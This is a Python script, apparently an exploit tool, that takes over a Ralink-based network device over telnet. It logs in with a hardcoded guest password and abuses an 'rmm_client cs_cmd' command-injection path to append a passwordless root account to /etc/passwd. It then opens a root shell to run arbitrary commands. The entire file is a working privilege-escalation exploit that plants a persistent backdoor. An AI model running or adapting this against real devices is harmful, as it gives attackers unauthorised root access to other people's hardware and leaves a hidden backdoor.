#!/usr/bin/env python3
# Get a clean root shell on the Ralink (via injected passwordless root) and run a command.
import sys, pexpect
HOST="192.168.157.185"; GUESTPW="1qaz@WSX"
cmd = sys.argv[1] if len(sys.argv)>1 else "id"

def try_root(cmd):
    c=pexpect.spawn("telnet %s"%HOST, timeout=30, encoding="latin-1")
    if c.expect(["login:", pexpect.TIMEOUT, pexpect.EOF])!=0: return None
    c.sendline("root")
    i=c.expect(["assword:", r"# ", pexpect.TIMEOUT], timeout=12)
    if i==0:
        c.sendline("")  # empty password
        j=c.expect([r"# ", "ncorrect", "login:", pexpect.TIMEOUT], timeout=12)
        if j!=0:
            try: c.close()
            except: pass
            return False
    elif i!=1:
        try: c.close()
        except: pass
        return None
    S="RSxx7Q"; E="RExx7Q"
    c.sendline("echo %s; %s; echo %s" % (S, cmd, E))
    c.expect(S, timeout=30); c.expect(S, timeout=30); c.expect(E, timeout=45)
    out=c.before
    c.sendline("exit")
    return out.replace("\r","")

def inject():
    c=pexpect.spawn("telnet %s"%HOST, timeout=30, encoding="latin-1")
    c.expect("login:"); c.sendline("guest"); c.expect("assword:"); c.sendline(GUESTPW)
    c.expect([r"\$ ", r"# "])
    c.sendline("rmm_client %s cs_cmd \"grep -q '^root::0' /etc/passwd || echo 'root::0:0:root:/tmp:/bin/sh' >> /etc/passwd\"" % HOST)
    c.expect([r"\$ ", r"# ", pexpect.TIMEOUT], timeout=15)
    c.sendline("exit");
    try: c.expect(pexpect.EOF, timeout=5)
    except: pass

r=try_root(cmd)
if r is False or r is None:
    inject()
    r=try_root(cmd)
print(r if r else "(root shell failed)")
